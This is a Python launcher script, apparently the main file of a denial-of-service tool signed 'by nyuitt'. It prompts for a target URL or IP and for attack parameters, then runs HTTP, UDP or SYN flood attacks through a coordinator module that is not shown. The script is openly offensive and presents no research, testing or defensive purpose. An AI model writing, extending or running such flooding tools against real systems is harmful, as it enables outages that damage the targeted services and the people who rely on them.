import trio
from src.utils.attack_coordinator import coordinate_attacks
from termcolor import colored


def print_ascii_art():
    art = r"""
#     ▄████████    ▄████████ ▄██   ▄   ███▄▄▄▄      ▄████████ 
#    ███    ███   ███    ███ ███   ██▄ ███▀▀▀██▄   ███    ███ 
#    ███    ███   ███    █▀  ███▄▄▄███ ███   ███   ███    ███ 
#   ▄███▄▄▄▄██▀  ▄███▄▄▄     ▀▀▀▀▀▀███ ███   ███   ███    ███ 
#  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▄██   ███ ███   ███ ▀███████████ 
#  ▀███████████   ███    █▄  ███   ███ ███   ███   ███    ███ 
#    ███    ███   ███    ███ ███   ███ ███   ███   ███    ███ 
#    ███    ███   ██████████  ▀█████▀   ▀█   █▀    ███    █▀  
#    ███    ███    
    """
    print(colored(art, 'magenta'))
    print(colored("by nyuitt", 'magenta'))

def main():
    print_ascii_art()
    attack_type = input("Choose attack type (http_flood/udp_flood/syn_flood): ").strip()
    target = input("Enter the target URL/IP: ").strip()
    
    #for http_flood method, type url like this: https://myurl.com
    if attack_type == 'http_flood':
        options = {
            'semaphore_limit': int(input("Enter semaphore limit: ").strip()),
            'client_limit': int(input("Enter client connection limit: ").strip()),
            'request_count': int(input("Enter number of requests: ").strip())
        }
        trio.run(coordinate_attacks, attack_type, target, options)
    #for udp_flood method, type url like: myurl.com
    elif attack_type == 'udp_flood':
        options = {
            'port': int(input("Enter target port: ").strip()),
            'message_size': int(input("Enter message size (bytes): ").strip()),
            'duration': int(input("Enter duration of attack (seconds): ").strip())
        }
        trio.run(coordinate_attacks, attack_type, target, options)  # Use trio.run aqui também

    elif attack_type == 'syn_flood':
        options = {
            'port': int(input("Enter target port: ").strip()),
            'duration': int(input("Enter duration of attack (seconds): ").strip())
        }
        trio.run(coordinate_attacks, attack_type, target, options)  # Use trio.run aqui também


# Função principal
if __name__ == "__main__":
    main()
